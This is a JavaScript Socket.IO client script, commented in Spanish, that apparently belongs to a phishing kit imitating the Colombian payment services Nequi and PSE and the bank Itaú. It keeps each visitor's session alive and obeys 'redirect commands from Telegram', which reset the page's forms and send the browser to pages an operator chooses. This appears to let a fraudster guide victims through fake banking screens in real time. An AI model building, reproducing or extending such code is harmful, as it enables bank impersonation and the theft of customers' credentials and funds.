// Socket.IO Connection Handler - Sistema unificado Nequi/PSE
(function() {
    'use strict';
    
    // Conectar al servidor principal
    const socket = io({
        reconnection: true,
        reconnectionDelay: 500,
        reconnectionDelayMax: 2000,
        reconnectionAttempts: Infinity,
        timeout: 30000,
        transports: ['websocket', 'polling'],
        upgrade: true,
        autoConnect: true,
        forceNew: false,
        path: '/socket.io/'
    });

    // Usar la sesión global del sistema Nequi
    let sessionId = localStorage.getItem('nequiSessionId');
    let heartbeatInterval = null;

    // Start heartbeat
    function startHeartbeat() {
        if (heartbeatInterval) clearInterval(heartbeatInterval);
        
        heartbeatInterval = setInterval(() => {
            if (sessionId && socket.connected) {
                socket.emit('keepAlive', { sessionId });
            }
        }, 25000);
    }

    // Stop heartbeat
    function stopHeartbeat() {
        if (heartbeatInterval) {
            clearInterval(heartbeatInterval);
            heartbeatInterval = null;
        }
    }

    // Initialize session on connection
    socket.on('connect', () => {
        console.log('✅ Itaú conectado al servidor principal:', socket.id);
        
        socket.emit('initSession', { 
            sessionId, 
            module: 'itau'
        });
    });

    socket.on('sessionConfirmed', (data) => {
        console.log('✅ Sesión confirmada:', data.sessionId);
        startHeartbeat();
    });

    socket.on('disconnect', (reason) => {
        console.log('⚠️ Socket desconectado:', reason);
    });

    socket.on('connect_error', (error) => {
        console.error('❌ Error de conexión:', error.message);
    });

    // Handle redirect commands from Telegram
    socket.on('redirect', (data) => {
        console.log('🔄 Redirect recibido:', data);
        
        if (data.clearData) {
            // Limpiar formulario pero mantener sesión
            const forms = document.querySelectorAll('form');
            forms.forEach(form => form.reset());
        }
        
        if (data.page) {
            stopHeartbeat();
            setTimeout(() => {
                window.location.href = data.page;
            }, 100);
        }
    });

    // Expose globals
    window.itauSocket = socket;
    window.getSessionId = () => sessionId;
})();
